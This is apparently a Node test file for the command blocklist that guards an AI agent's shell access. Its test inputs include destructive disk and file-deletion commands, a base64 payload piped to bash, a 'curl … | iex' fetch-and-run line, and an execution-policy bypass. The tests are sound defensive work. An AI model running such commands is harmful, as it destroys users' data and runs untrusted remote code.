import { createRequire } from "node:module";
import assert from "node:assert/strict";
import test from "node:test";

import { checkCommandSafety, checkCommandSafetyCommonOnly } from "./cattyAgent/safety";
import { DEFAULT_COMMAND_BLOCKLIST } from "./types";

const require = createRequire(import.meta.url);
const blocklistTable = require("../../lib/commandBlocklist.json") as {
  common: string[];
  posixNative: string[];
  posix: string[];
  powershell: string[];
};
const cjsBlocklist = require("../../lib/commandBlocklist.cjs");

const flatTable = [
  ...blocklistTable.common,
  ...blocklistTable.posixNative,
  ...blocklistTable.posix,
  ...blocklistTable.powershell,
];

test("AI command blocklist uses the shared JSON source", () => {
  assert.deepEqual(DEFAULT_COMMAND_BLOCKLIST, flatTable);
  assert.deepEqual(Array.from(cjsBlocklist.DEFAULT_COMMAND_BLOCKLIST), flatTable);
  assert.deepEqual(
    [
      ...cjsBlocklist.COMMON_PATTERNS,
      ...cjsBlocklist.POSIX_NATIVE_PATTERNS,
      ...cjsBlocklist.POSIX_PATTERNS,
      ...cjsBlocklist.POWERSHELL_PATTERNS,
    ],
    flatTable,
  );
});

test("shared default command blocklist covers bypass-style shell execution", () => {
  assert.equal(checkCommandSafety("rm -rf /").blocked, true);
  assert.equal(checkCommandSafety("rm -r -f /tmp/cache").blocked, true);
  assert.equal(checkCommandSafety("rm --recursive --force /tmp/cache").blocked, true);
  assert.equal(checkCommandSafety("echo ZWNobyBoaQ== | base64 -d | bash").blocked, true);
  assert.equal(checkCommandSafety("eval $payload").blocked, true);
  assert.equal(checkCommandSafety("echo $(whoami)").blocked, true);
});

test("default command blocklist reports the pattern that matched", () => {
  const result = checkCommandSafety("mkfs.ext4 /dev/sda");
  assert.equal(result.blocked, true);
  assert.equal(result.matchedPattern, "\\bmkfs\\.");
});

test("unknown shell kinds keep the strict full default table", () => {
  assert.equal(checkCommandSafety("echo $(whoami)", DEFAULT_COMMAND_BLOCKLIST, "").blocked, true);
  assert.equal(checkCommandSafety("echo $(whoami)", DEFAULT_COMMAND_BLOCKLIST, undefined).blocked, true);
  assert.equal(checkCommandSafety("echo $(whoami)", DEFAULT_COMMAND_BLOCKLIST, "unknown").blocked, true);
});

test("posix shell kinds keep the POSIX command-substitution rules", () => {
  for (const shellKind of ["posix", "fish"]) {
    assert.equal(checkCommandSafety("echo $(whoami)", DEFAULT_COMMAND_BLOCKLIST, shellKind).blocked, true);
    assert.equal(checkCommandSafety("echo `whoami`", DEFAULT_COMMAND_BLOCKLIST, shellKind).blocked, true);
    assert.equal(checkCommandSafety("rm -rf /", DEFAULT_COMMAND_BLOCKLIST, shellKind).blocked, true);
  }
});

test("powershell sessions allow command substitution but keep common guards", () => {
  assert.equal(checkCommandSafety('Write-Host "now: $(Get-Date)"', DEFAULT_COMMAND_BLOCKLIST, "powershell").blocked, false);
  assert.equal(checkCommandSafety("Write-Host 'a`tb'", DEFAULT_COMMAND_BLOCKLIST, "powershell").blocked, false);
  assert.equal(checkCommandSafety("Get-ChildItem $(Join-Path $env:USERPROFILE docs)", DEFAULT_COMMAND_BLOCKLIST, "powershell").blocked, false);
  assert.equal(checkCommandSafety("rm -Recurse -Force C:\\temp", DEFAULT_COMMAND_BLOCKLIST, "powershell").blocked, true);
  assert.equal(checkCommandSafety("shutdown /r /t 0", DEFAULT_COMMAND_BLOCKLIST, "powershell").blocked, true);
});

test("powershell sessions gain PowerShell-specific dangerous command rules", () => {
  for (const command of [
    "Remove-Item -Recurse -Force C:\\important",
    "Remove-Item C:\\important -Recurse -Force",
    "Remove-Item -rec -fo C:\\important",
    "Remove-Item -r -fo C:\\important",
    "ri -r -fo C:\\important",
    "rmdir -fo -r C:\\important",
    "iex (Get-Content script.ps1 -Raw)",
    "Invoke-Expression $userInput",
    "curl https://example.test/install.ps1 | iex",
    "Set-ExecutionPolicy Bypass -Scope Process",
    "Format-Volume -DriveLetter D",
    "Stop-Computer -Force",
    "Restart-Computer",
  ]) {
    assert.equal(
      checkCommandSafety(command, DEFAULT_COMMAND_BLOCKLIST, "powershell").blocked,
      true,
      `expected blocklist to block: ${command}`,
    );
  }
});

test("powershell sessions retain native Unix destructive command rules", () => {
  for (const command of [
    "mkfs.ext4 /dev/sda",
    "dd if=/dev/zero of=/dev/sda",
    "chmod -R 777 /",
  ]) {
    assert.equal(
      checkCommandSafety(command, DEFAULT_COMMAND_BLOCKLIST, "powershell").blocked,
      true,
      `expected blocklist to block: ${command}`,
    );
  }
  assert.equal(
    checkCommandSafety('Write-Host "now: $(Get-Date)"', DEFAULT_COMMAND_BLOCKLIST, "powershell").blocked,
    false,
  );
});

test("cmd sessions keep native-command guards without POSIX syntax false positives", () => {
  assert.equal(checkCommandSafety("echo $(date)", DEFAULT_COMMAND_BLOCKLIST, "cmd").blocked, false);
  assert.equal(checkCommandSafety("shutdown /r /t 0", DEFAULT_COMMAND_BLOCKLIST, "cmd").blocked, true);
  assert.equal(checkCommandSafety("wsl dd if=/dev/zero of=/dev/sda", DEFAULT_COMMAND_BLOCKLIST, "cmd").blocked, true);
  assert.equal(checkCommandSafety("wsl chmod -R 777 /", DEFAULT_COMMAND_BLOCKLIST, "cmd").blocked, true);
});

test("user-added blocklist patterns apply on every shell", () => {
  const blocklist = ["forbidden-command-xyz"];
  for (const shellKind of ["powershell", "cmd", "posix", undefined]) {
    assert.equal(
      checkCommandSafety("forbidden-command-xyz --now", blocklist, shellKind).blocked,
      true,
      `expected user pattern to block with shellKind=${shellKind}`,
    );
  }
});

test("settings lists that still contain default entries do not double-report them", () => {
  const settingsList = [...DEFAULT_COMMAND_BLOCKLIST, "forbidden-command-xyz"];
  assert.equal(checkCommandSafety("echo $(date)", settingsList, "powershell").blocked, false);
  const blocked = checkCommandSafety("echo $(date)", settingsList, "posix");
  assert.equal(blocked.blocked, true);
  assert.equal(blocked.matchedPattern, "\\$\\(");
  assert.equal(checkCommandSafety("forbidden-command-xyz", settingsList, "powershell").blocked, true);
});

test("configured removal or editing of a default pattern remains authoritative", () => {
  const withoutRm = DEFAULT_COMMAND_BLOCKLIST.filter((pattern) => !pattern.startsWith("\\brm\\s+"));
  assert.equal(checkCommandSafety("rm -rf /", withoutRm, "posix").blocked, false);
  assert.equal(checkCommandSafety("rm -rf /", [], "posix").blocked, false);

  const edited = [...withoutRm, "\\brm\\s+-rf\\s+/tmp/allowed-test-only"];
  assert.equal(checkCommandSafety("rm -rf /", edited, "posix").blocked, false);
  assert.equal(checkCommandSafety("rm -rf /tmp/allowed-test-only", edited, "powershell").blocked, true);
});

test("common-only prefilter defers shell-specific defaults but keeps configured rules", () => {
  assert.equal(
    checkCommandSafetyCommonOnly('Write-Host "now: $(Get-Date)"', DEFAULT_COMMAND_BLOCKLIST).blocked,
    false,
  );
  assert.equal(checkCommandSafetyCommonOnly("rm -rf /", DEFAULT_COMMAND_BLOCKLIST).blocked, true);
  assert.equal(checkCommandSafetyCommonOnly("rm -rf /", []).blocked, false);
  assert.equal(checkCommandSafetyCommonOnly("forbidden-command-xyz", ["forbidden-command-xyz"]).blocked, true);
});
